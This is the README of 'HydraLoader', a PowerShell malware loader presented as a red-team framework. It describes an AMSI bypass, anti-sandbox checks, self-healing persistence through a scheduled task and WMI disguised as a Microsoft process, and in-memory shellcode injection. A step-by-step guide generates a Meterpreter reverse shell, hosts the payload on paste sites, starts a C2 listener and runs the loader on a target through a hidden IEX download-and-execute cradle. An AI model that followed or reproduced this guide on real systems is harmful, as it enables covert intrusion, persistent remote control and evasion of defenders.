<p align="center">
  <img src="https://imgur.com/a/hydraloader-5wYGBco" alt="HydraLoader Logo" width="200"/>
</p>
<h1 align="center">
  <br>
  🐍 HydraLoader 🛡️
  <br>
</h1>

<h4 align="center">The process that refuses to die. A PowerShell loader built on a self-healing persistence engine, designed to survive and thrive even under active incident response.</h4>

<p align="center">
  <a href="https://github.com/ZeroEthical/HydraLoader/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge" alt="License">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Language-PowerShell-blue.svg?style=for-the-badge&logo=powershell" alt="Language">
  </a>
    <a href="https://github.com/ZeroEthical">
    <img src="https://img.shields.io/badge/Author-ZeroEthical-purple?style=for-the-badge" alt="Author">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Maintained%3F-Yes-green.svg?style=for-the-badge" alt="Maintained">
  </a>
</p>

<p align="center">
  <a href="#-about-the-project">About</a> •
  <a href="#-key-features">Key Features</a> •
  <a href="#-architecture--flow">Architecture</a> •
  <a href="#-getting-started">Getting Started</a> •
  <a href="#-disclaimer">Disclaimer</a> •
  <a href="#-author">Author</a>
</p>

---

## 📖 About The Project

**HydraLoader** is a highly sophisticated and resilient PowerShell-based payload execution framework, designed for advanced penetration testing and red teaming operations. It employs a multi-layered approach to evasion, persistence, and in-memory execution, aiming to operate undetected in modern, highly monitored environments.

---

## ✨ Key Features

<details>
<summary>🧠 <strong>Evasion & Anti-Analysis</strong></summary>
<br>

-   **In-Memory AMSI Bypass**: Dynamically patches the Antimalware Scan Interface (AMSI) at runtime to neutralize script-based threat detection.
-   **Comprehensive Environment Checks**: Actively detects and evades analysis environments by checking for:
    -   **Debuggers**: Uses native `IsDebuggerPresent()` API calls.
    -   **Sandboxes**: Verifies system RAM, CPU core count, and uptime.
    -   **Analysis Tools**: Scans for common virtualization and analysis processes (e.g., Wireshark, Process Monitor, VMware/VirtualBox tools).
-   **Deep Obfuscation**: The entire script is heavily obfuscated, with critical strings (API functions, DLLs) Base64 encoded and a compacted code structure to deter static analysis.
</details>

<details>
<summary>🐍 <strong>The "Hydra" Persistence Engine</strong></summary>
<br>

HydraLoader employs a dual-headed, self-healing persistence mechanism to ensure long-term access and resilience against removal attempts.

-   **Method 1: Scheduled Task (Elevated Privileges)**: Creates a scheduled task disguised as a legitimate system process (`Microsoft Compatibility Appraiser`) that runs with `SYSTEM` privileges at logon.
-   **Method 2: WMI Event Subscription (Maximum Stealth)**: Establishes a permanent WMI event subscription that triggers on a timer. This method is extremely difficult to detect as it resides in the WMI repository, outside of standard auto-run locations.
-   **Self-Healing Capability**: On each execution, the framework checks if both persistence mechanisms are active. If one has been discovered and removed, the other automatically recreates it, ensuring the "Hydra" survives.
</details>

<details>
<summary>🚀 <strong>Payload Execution</strong></summary>
<br>

-   **"Fileless" In-Memory Operation**: The payload is downloaded directly into a memory buffer, decoded, and executed without ever touching the disk, minimizing the forensic footprint.
-   **AES-256 Decryption Framework**: Includes a function to decrypt payloads using AES-256 (CBC). This allows the payload to be stored and transmitted in an encrypted state, rendering it useless to network inspection tools. *(Note: Requires a pre-encrypted payload)*.
-   **Dynamic API Resolution**: Resolves all necessary Windows API functions dynamically at runtime, avoiding suspicious static import tables.
</details>

---

## ⚙️ Architecture & Flow

1.  **Initialization**: The AMSI bypass is executed instantly.
2.  **Evasion Checks**: The script performs all anti-analysis and anti-sandbox checks. If any fail, it terminates silently.
3.  **Persistence Check & Repair**: The Hydra engine verifies that both the Scheduled Task and WMI Subscription are in place. If not, it creates them.
4.  **Payload Delivery**: The framework downloads the payload from the configured URL directly into memory.
5.  **Decryption & Preparation**: The payload is Base64 decoded. If AES is enabled, it is then decrypted.
6.  **Execution**: The final payload is injected into memory and executed via stealthy Windows API calls.

---

## 🚀 How to Use This Beast 😏

This guide will walk you through preparing your payload, configuring HydraLoader, and deploying it on a target system.

### Step 1: Payload Preparation (Example with `msfvenom`)

First, you need to generate your shellcode. For this example, we'll create a simple reverse shell payload.

1.  **Generate Raw Shellcode**:
    Use a tool like Metasploit's `msfvenom` to create the raw shellcode.

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o shellcode.bin
    ```
    > Replace `YOUR_IP` and `YOUR_PORT` with your listener's details.

2.  **Encode the Shellcode in Base64**:
    HydraLoader expects the payload to be Base64 encoded.

    ```powershell
    # In PowerShell
    $bytes = [System.IO.File]::ReadAllBytes("C:\path\to\shellcode.bin")
    [System.Convert]::ToBase64String($bytes) | Out-File shellcode_b64.txt
    ```
    > Copy the resulting Base64 string. You'll need it in the next step.

### Step 2: Host Your Payload

1.  **Host the Base64 Payload**:
    Paste the Base64 string you just copied into a file (e.g., `payload.txt`) and host it on a web server or a service like GitHub Gist, Pastebin, etc.
2.  **Get the Raw URL**:
    Make sure you have a direct, raw link to the file content. For example, a GitHub Gist raw URL looks like `https://gist.githubusercontent.com/user/gist_id/raw/payload.txt`.

### Step 3: Configure HydraLoader

Now, you need to configure the `MALWARE DECODED.ps1` script itself.

1.  **Update the Payload URL**:
    -   Find the `$cfg` hashtable at the beginning of the script.
    -   Locate the key `$cfg.o`. This holds the Base64 encoded URL of your payload.
    -   First, encode your raw payload URL in Base64:
        ```powershell
        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://your-raw-payload-url.com/payload.txt"))
        ```
    -   Replace the existing value of `$cfg.o` with your new Base64 encoded URL.

### Step 4: (Optional) Configure AES Encryption for Maximum Stealth

If you want to add another layer of protection, you can encrypt your payload.

1.  **Generate a Key and IV**:
    You need a 32-byte (256-bit) key and a 16-byte (128-bit) IV. You can generate them in PowerShell:
    ```powershell
    # Generate a random 32-byte key
    $key = -join ((0..31) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })
    # Generate a random 16-byte IV
    $iv = -join ((0..15) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })

    Write-Host "Key: $key"
    Write-Host "IV: $iv"
    ```

2.  **Encrypt the Shellcode**:
    Use your favorite encryption script or tool (like CyberChef) with your generated Key and IV to encrypt your **raw** shellcode file (`shellcode.bin`). Then, Base64 encode the **encrypted** output.

3.  **Configure HydraLoader with Keys**:
    -   Base64 encode your Key and IV:
        ```powershell
        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_32_BYTE_KEY_HERE"))
        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_16_BYTE_IV_HERE"))
        ```
    -   Update `$cfg.r` (key) and `$cfg.s` (IV) in the script with these new Base64 values.

4.  **Activate Decryption in Script**:
    -   In the `MALWARE DECODED.ps1` script, find the payload handling section.
    -   Uncomment the three lines responsible for decryption:
        ```powershell
        # $k = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.r)); $iv = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.s))
        # $exec_buf = Expand-Stream -d $buf -k $k -iv $iv; if (-not $exec_buf) { exit }
        ```
        And comment out the line that bypasses it:
        ```powershell
        # $exec_buf = $buf
        ```

### Step 5: Deployment

With your payload prepared and HydraLoader configured, you're ready for deployment.

1.  **Set Up Your Listener**:
    Start your C2 listener (e.g., Metasploit's `multi/handler`) to catch the incoming connection.

2.  **Execute on Target**:
    Deliver and execute the `MALWARE DECODED.ps1` script on the target machine. You can use any standard execution method:
    ```powershell
    # Example: Direct execution
    powershell.exe -ExecutionPolicy Bypass -File ".\MALWARE DECODED.ps1"

    # Example: Remote download and execution (IEX cradle)
    powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://your-server/MALWARE%20DECODED.ps1')"
    ```
    On its first run, HydraLoader will set up its persistence mechanisms and then proceed with the payload execution. Subsequent runs will ensure persistence is maintained before executing the payload.

---

## ⚠️ Disclaimer

This tool is intended for authorized red teaming, security research, and educational purposes **only**. Unauthorized use of this framework against any system is illegal. The author assumes no liability and is not responsible for any misuse or damage caused by this program.

---

## 🙏 Acknowledgements

A special thanks to our friends in the Telegram community for providing the base code that inspired the creation of this project.

-   [@scarlettaowner](https://t.me/scarlettaowner)
-   [@viperzcrew](https://t.me/viperzcrew2)

---

## ✍️ Author

-   **ZeroEthical** - [GitHub](https://github.com/ZeroEthical) [Telegram](https://t.me/ZeroEthical)
-   
